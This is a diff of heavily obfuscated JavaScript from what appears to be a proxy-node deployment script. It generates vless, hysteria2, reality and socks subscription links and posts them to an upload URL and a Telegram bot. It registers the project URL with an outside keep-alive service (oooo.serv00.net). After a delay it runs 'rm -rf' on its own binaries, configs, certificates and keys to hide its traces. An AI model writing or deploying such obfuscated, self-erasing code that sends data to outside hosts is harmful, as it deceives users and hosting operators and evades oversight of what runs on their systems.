+          _0x4b85df = '\x0ahysteria2://' + UUID + '@' + _0x5073a2 + ':' + HY2_PORT + _0x7a612(0x1ed) + _0x200559 + '#' + _0x491774
+        _0x43ace5 += _0x4b85df
       }
       if (isValidPort(REALITY_PORT)) {
-        const _0xeec02 = _0x34b469(0x1dd) + UUID + '@' + _0x14c8a0 + ':' + REALITY_PORT + _0x34b469(0x195) + publicKey + _0x34b469(0x18b) + _0x58b121
-        _0x691f38 += _0xeec02
+        const _0x210147 =
+          _0x7a612(0x25e) +
+          UUID +
+          '@' +
+          _0x5073a2 +
+          ':' +
+          REALITY_PORT +
+          '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=' +
+          publicKey +
+          '&type=tcp&headerType=none#' +
+          _0x491774
+        _0x43ace5 += _0x210147
       }
       if (isValidPort(S5_PORT)) {
-        const _0x20e945 = Buffer[_0x34b469(0xdf)](UUID[_0x34b469(0x10a)](0x0, 0x8) + ':' + UUID[_0x34b469(0x1c7)](-0xc))[_0x34b469(0xe4)](
-            _0x34b469(0x125)
+        const _0x49bdbb = Buffer[_0x7a612(0x163)](UUID[_0x7a612(0x24f)](0x0, 0x8) + ':' + UUID[_0x7a612(0x1e4)](-0xc))[_0x7a612(0x21d)](
+            _0x7a612(0x23e)
           ),
-          _0x46267c = _0x34b469(0x199) + _0x20e945 + '@' + _0x14c8a0 + ':' + S5_PORT + '#' + _0x58b121
-        _0x691f38 += _0x46267c
+          _0x5c3dd8 = _0x7a612(0x1e3) + _0x49bdbb + '@' + _0x5073a2 + ':' + S5_PORT + '#' + _0x491774
+        _0x43ace5 += _0x5c3dd8
       }
-      ;(console['log'](Buffer[_0x34b469(0xdf)](_0x691f38)[_0x34b469(0xe4)]('base64')),
-        fs[_0x34b469(0x19c)](subPath, Buffer['from'](_0x691f38)[_0x34b469(0xe4)](_0x34b469(0x125))),
-        fs['writeFileSync'](listPath, _0x691f38, _0x34b469(0x1c4)),
-        console[_0x34b469(0x12d)](FILE_PATH + _0x34b469(0xde)),
-        (subContent = Buffer[_0x34b469(0xdf)](_0x691f38)[_0x34b469(0xe4)](_0x34b469(0x125))),
+      ;(console['log'](Buffer[_0x7a612(0x163)](_0x43ace5)['toString'](_0x7a612(0x23e))),
+        fs[_0x7a612(0x16a)](subPath, Buffer[_0x7a612(0x163)](_0x43ace5)[_0x7a612(0x21d)](_0x7a612(0x23e))),
+        fs['writeFileSync'](listPath, _0x43ace5, _0x7a612(0x168)),
+        console['log'](FILE_PATH + _0x7a612(0x17c)),
+        (subContent = Buffer[_0x7a612(0x163)](_0x43ace5)[_0x7a612(0x21d)](_0x7a612(0x23e))),
         uploadNodes(),
-        _0x35b103(_0x691f38))
+        _0x3f1e38(_0x43ace5))
     }, 0x7d0)
   })
 }
 async function uploadNodes() {
-  const _0x188c14 = _0x3e3e40
+  const _0x3f6838 = _0x2a1a64
   if (UPLOAD_URL && PROJECT_URL) {
-    const _0x3e5430 = PROJECT_URL + '/' + SUB_PATH,
-      _0x2c8c54 = { subscription: [_0x3e5430] }
+    const _0x1fa5e7 = PROJECT_URL + '/' + SUB_PATH,
+      _0x2ca427 = { subscription: [_0x1fa5e7] }
     try {
-      const _0x5b7a14 = await axios[_0x188c14(0x168)](UPLOAD_URL + _0x188c14(0x1e3), _0x2c8c54, { headers: { 'Content-Type': _0x188c14(0x1f4) } })
-      return _0x5b7a14 && _0x5b7a14[_0x188c14(0x1ac)] === 0xc8 ? (console[_0x188c14(0x12d)](_0x188c14(0xf4)), _0x5b7a14) : null
-    } catch (_0x2f2ac4) {
-      if (_0x2f2ac4[_0x188c14(0xf2)]) {
-        if (_0x2f2ac4[_0x188c14(0xf2)][_0x188c14(0x1ac)] === 0x190) {
+      const _0x6a5cd6 = await axios[_0x3f6838(0x1b6)](UPLOAD_URL + _0x3f6838(0x15f), _0x2ca427, { headers: { 'Content-Type': _0x3f6838(0x242) } })
+      return _0x6a5cd6 && _0x6a5cd6['status'] === 0xc8 ? (console['log']('Subscription\x20uploaded\x20successfully'), _0x6a5cd6) : null
+    } catch (_0x4c5d8a) {
+      if (_0x4c5d8a[_0x3f6838(0x24a)]) {
+        if (_0x4c5d8a[_0x3f6838(0x24a)][_0x3f6838(0x262)] === 0x190) {
         }
       }
     }
   } else {
     if (UPLOAD_URL) {
-      if (!fs['existsSync'](listPath)) return
-      const _0x350d10 = fs[_0x188c14(0x186)](listPath, _0x188c14(0x142)),
-        _0x1da3e3 = _0x350d10[_0x188c14(0x1e9)]('\x0a')[_0x188c14(0x1f3)]((_0x3c5644) =>
-          /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x188c14(0xfc)](_0x3c5644)
+      if (!fs[_0x3f6838(0x201)](listPath)) return
+      const _0x29ceef = fs['readFileSync'](listPath, 'utf-8'),
+        _0x2be027 = _0x29ceef[_0x3f6838(0x183)]('\x0a')[_0x3f6838(0x1ba)]((_0x5b3ce9) =>
+          /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x5b3ce9)
         )
-      if (_0x1da3e3[_0x188c14(0x1c2)] === 0x0) return
-      const _0x21f232 = JSON[_0x188c14(0x109)]({ nodes: _0x1da3e3 })
+      if (_0x2be027[_0x3f6838(0x1e8)] === 0x0) return
+      const _0x52ff5a = JSON[_0x3f6838(0x217)]({ nodes: _0x2be027 })
       try {
-        const _0xfe4d9 = await axios[_0x188c14(0x168)](UPLOAD_URL + _0x188c14(0x17a), _0x21f232, { headers: { 'Content-Type': _0x188c14(0x1f4) } })
-        return _0xfe4d9 && _0xfe4d9[_0x188c14(0x1ac)] === 0xc8 ? (console[_0x188c14(0x12d)]('Nodes\x20uploaded\x20successfully'), _0xfe4d9) : null
-      } catch (_0x5d3130) {
+        const _0x21dba1 = await axios[_0x3f6838(0x1b6)](UPLOAD_URL + _0x3f6838(0x1b2), _0x52ff5a, { headers: { 'Content-Type': 'application/json' } })
+        return _0x21dba1 && _0x21dba1[_0x3f6838(0x262)] === 0xc8 ? (console[_0x3f6838(0x189)](_0x3f6838(0x1f6)), _0x21dba1) : null
+      } catch (_0x470e4f) {
         return null
       }
     } else return
@@ -1062,59 +1042,52 @@ async function uploadNodes() {
 }
 function cleanFiles() {
   setTimeout(() => {
-    const _0x5e941e = _0x60c6,
-      _0x2ad3b5 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
-    if (NEZHA_PORT) _0x2ad3b5[_0x5e941e(0x141)](npmPath)
-    else NEZHA_SERVER && NEZHA_KEY && _0x2ad3b5[_0x5e941e(0x141)](phpPath)
-    process[_0x5e941e(0xff)] === 'win32'
-      ? exec('del\x20/f\x20/q\x20' + _0x2ad3b5[_0x5e941e(0x1b9)]('\x20') + '\x20>\x20nul\x202>&1', (_0x23d3e2) => {
-          const _0x37b509 = _0x5e941e
-          ;(console[_0x37b509(0x181)](),
-            alwaysLog('App\x20is\x20running'),
-            console[_0x37b509(0x12d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
+    const _0x559d46 = _0x4856,
+      _0x1e3e3e = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
+    if (NEZHA_PORT) _0x1e3e3e[_0x559d46(0x1a0)](npmPath)
+    else NEZHA_SERVER && NEZHA_KEY && _0x1e3e3e[_0x559d46(0x1a0)](phpPath)
+    process['platform'] === 'win32'
+      ? exec(_0x559d46(0x18b) + _0x1e3e3e['join']('\x20') + _0x559d46(0x1d3), (_0x191dc0) => {
+          const _0x2ecb75 = _0x559d46
+          ;(console[_0x2ecb75(0x24e)](), alwaysLog('App\x20is\x20running'), console[_0x2ecb75(0x189)](_0x2ecb75(0x19d)))
         })
-      : exec(_0x5e941e(0x1e6) + _0x2ad3b5[_0x5e941e(0x1b9)]('\x20') + _0x5e941e(0x179), (_0x413cf6) => {
-          const _0x2f48b2 = _0x5e941e
-          ;(console[_0x2f48b2(0x181)](), alwaysLog(_0x2f48b2(0x1d5)), console[_0x2f48b2(0x12d)](_0x2f48b2(0x113)))
+      : exec('rm\x20-rf\x20' + _0x1e3e3e[_0x559d46(0x157)]('\x20') + _0x559d46(0x198), (_0x5f37a5) => {
+          const _0x2e0eec = _0x559d46
+          ;(console[_0x2e0eec(0x24e)](), alwaysLog(_0x2e0eec(0x248)), console[_0x2e0eec(0x189)](_0x2e0eec(0x19d)))
         })
   }, 0x15f90)
 }
 cleanFiles()
 async function sendTelegram() {
-  const _0x51e3e1 = _0x3e3e40
+  const _0xafdb36 = _0x2a1a64
   if (!BOT_TOKEN || !CHAT_ID) {
-    console[_0x51e3e1(0x12d)](_0x51e3e1(0x1f1))
+    console[_0xafdb36(0x189)](_0xafdb36(0x1e7))
     return
   }
   try {
-    const _0x4f4d0e = fs[_0x51e3e1(0x186)](subPath, 'utf8'),
-      _0x5a2b88 = _0x51e3e1(0x10c) + BOT_TOKEN + '/sendMessage',
-      _0x4fde43 = NAME[_0x51e3e1(0x155)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x51e3e1(0x15b)),
-      _0x3e3093 = { chat_id: CHAT_ID, text: '**' + _0x4fde43 + _0x51e3e1(0xea) + _0x4f4d0e + '```', parse_mode: _0x51e3e1(0x185) }
-    ;(await axios[_0x51e3e1(0x168)](_0x5a2b88, null, { params: _0x3e3093 }), console[_0x51e3e1(0x12d)](_0x51e3e1(0x16d)))
-  } catch (_0x211ef5) {
-    console[_0x51e3e1(0xd1)](_0x51e3e1(0x167), _0x211ef5['message'])
+    const _0x131fd8 = fs[_0xafdb36(0x21e)](subPath, _0xafdb36(0x168)),
+      _0xe0face = 'https://api.telegram.org/bot' + BOT_TOKEN + _0xafdb36(0x1eb),
+      _0x564b97 = NAME['replace'](/[_*\[\]()~`>#+=|{}.!-]/g, '\x5c$&'),
+      _0x4b251d = { chat_id: CHAT_ID, text: '**' + _0x564b97 + _0xafdb36(0x1ee) + _0x131fd8 + '```', parse_mode: _0xafdb36(0x1c3) }
+    ;(await axios['post'](_0xe0face, null, { params: _0x4b251d }), console[_0xafdb36(0x189)](_0xafdb36(0x227)))
+  } catch (_0xefc2cd) {
+    console[_0xafdb36(0x1ef)]('Failed\x20to\x20send\x20Telegram\x20message:', _0xefc2cd[_0xafdb36(0x222)])
   }
 }
 async function AddVisitTask() {
-  const _0x12317b = _0x3e3e40
+  const _0x1007c5 = _0x2a1a64
   if (!AUTO_ACCESS || !PROJECT_URL) {
-    console['log']('Skipping\x20adding\x20automatic\x20access\x20task')
+    console[_0x1007c5(0x189)](_0x1007c5(0x199))
     return
   }
   try {
-    const _0x2c4582 = await axios[_0x12317b(0x168)](
-      'https://oooo.serv00.net/add-url',
-      { url: PROJECT_URL },
-      { headers: { 'Content-Type': 'application/json' } }
-    )
-    return (console[_0x12317b(0x12d)](_0x12317b(0x13d)), _0x2c4582)
-  } catch (_0x27e29a) {
-    return (console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20' + _0x27e29a[_0x12317b(0x14b)]), null)
+    const _0x1f83ba = await axios['post'](_0x1007c5(0x151), { url: PROJECT_URL }, { headers: { 'Content-Type': 'application/json' } })
+    return (console[_0x1007c5(0x189)](_0x1007c5(0x1c0)), _0x1f83ba)
+  } catch (_0x582a73) {
+    return (console['error'](_0x1007c5(0x174) + _0x582a73[_0x1007c5(0x222)]), null)
   }
 }
 async function startserver() {
-  const _0x1573e0 = _0x3e3e40
   try {
     ;(argoType(),
       deleteNodes(),
@@ -1126,38 +1099,39 @@ async function startserver() {
       await extractDomains(),
       await sendTelegram(),
       await AddVisitTask())
-  } catch (_0x357c24) {
-    console[_0x1573e0(0xd1)](_0x1573e0(0x1a9), _0x357c24)
+  } catch (_0x175c1f) {
+    console['error']('Error\x20in\x20startserver:', _0x175c1f)
   }
 }
-startserver()['catch']((_0x32a055) => {
-  const _0x4f7940 = _0x3e3e40
-  console['error'](_0x4f7940(0x163), _0x32a055)
+startserver()[_0x2a1a64(0x17d)]((_0x202b94) => {
+  const _0x5a01ba = _0x2a1a64
+  console[_0x5a01ba(0x1ef)](_0x5a01ba(0x252), _0x202b94)
 })
-const server = http[_0x3e3e40(0x106)](async (_0x23bc57, _0x3f809b) => {
-  const _0x63bd7f = _0x3e3e40,
-    _0x8bf8b3 = _0x23bc57[_0x63bd7f(0x12b)][_0x63bd7f(0x1e9)]('?')[0x0]
-  if (_0x8bf8b3 === '/' + SUB_PATH) {
-    if (subContent) (_0x3f809b['writeHead'](0xc8, { 'Content-Type': 'text/plain;\x20charset=utf-8' }), _0x3f809b[_0x63bd7f(0x13b)](subContent))
+const server = http['createServer'](async (_0x52a14d, _0x4d2084) => {
+  const _0x51cb4e = _0x2a1a64,
+    _0x38b7e0 = _0x52a14d[_0x51cb4e(0x14f)][_0x51cb4e(0x183)]('?')[0x0]
+  if (_0x38b7e0 === '/' + SUB_PATH) {
+    if (subContent) (_0x4d2084['writeHead'](0xc8, { 'Content-Type': _0x51cb4e(0x1d8) }), _0x4d2084[_0x51cb4e(0x1c2)](subContent))
     else
       try {
-        const _0x21962f = fs['readFileSync'](subPath, _0x63bd7f(0x142))
-        ;(_0x3f809b[_0x63bd7f(0x1d6)](0xc8, { 'Content-Type': _0x63bd7f(0x174) }), _0x3f809b[_0x63bd7f(0x13b)](_0x21962f))
-      } catch (_0x612f7d) {
-        ;(_0x3f809b[_0x63bd7f(0x1d6)](0x1f7, { 'Content-Type': _0x63bd7f(0x174) }), _0x3f809b[_0x63bd7f(0x13b)](_0x63bd7f(0x184)))
+        const _0x59d1e0 = fs[_0x51cb4e(0x21e)](subPath, 'utf-8')
+        ;(_0x4d2084[_0x51cb4e(0x1d6)](0xc8, { 'Content-Type': _0x51cb4e(0x1d8) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x59d1e0))
+      } catch (_0x43b3ac) {
+        ;(_0x4d2084[_0x51cb4e(0x1d6)](0x1f7, { 'Content-Type': _0x51cb4e(0x1d8) }),
+          _0x4d2084[_0x51cb4e(0x1c2)]('Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.'))
       }
     return
   }
-  if (_0x8bf8b3 === '/') {
+  if (_0x38b7e0 === '/') {
     try {
-      const _0x2e92f3 = path[_0x63bd7f(0x1b9)](__dirname, _0x63bd7f(0x114)),
-        _0x3f2e98 = await fs['promises']['readFile'](_0x2e92f3, _0x63bd7f(0x1c4))
-      ;(_0x3f809b[_0x63bd7f(0x1d6)](0xc8, { 'Content-Type': _0x63bd7f(0xfe) }), _0x3f809b[_0x63bd7f(0x13b)](_0x3f2e98))
-    } catch (_0x1363e2) {
-      ;(_0x3f809b[_0x63bd7f(0x1d6)](0xc8, { 'Content-Type': _0x63bd7f(0xfe) }), _0x3f809b[_0x63bd7f(0x13b)](_0x63bd7f(0x15a)))
+      const _0x1623d2 = path['join'](__dirname, _0x51cb4e(0x1bf)),
+        _0x54e723 = await fs['promises'][_0x51cb4e(0x25c)](_0x1623d2, 'utf8')
+      ;(_0x4d2084[_0x51cb4e(0x1d6)](0xc8, { 'Content-Type': _0x51cb4e(0x19a) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x54e723))
+    } catch (_0xe18231) {
+      ;(_0x4d2084[_0x51cb4e(0x1d6)](0xc8, { 'Content-Type': _0x51cb4e(0x19a) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x51cb4e(0x22a)))
     }
     return
   }
-  ;(_0x3f809b[_0x63bd7f(0x1d6)](0x194, { 'Content-Type': 'text/plain;\x20charset=utf-8' }), _0x3f809b[_0x63bd7f(0x13b)](_0x63bd7f(0x1a8)))
+  ;(_0x4d2084[_0x51cb4e(0x1d6)](0x194, { 'Content-Type': _0x51cb4e(0x1d8) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x51cb4e(0x225)))
 })
-server[_0x3e3e40(0x1b8)](PORT, () => alwaysLog(_0x3e3e40(0x133) + PORT + '!'))
+server['listen'](PORT, () => alwaysLog(_0x2a1a64(0x1c7) + PORT + '!'))
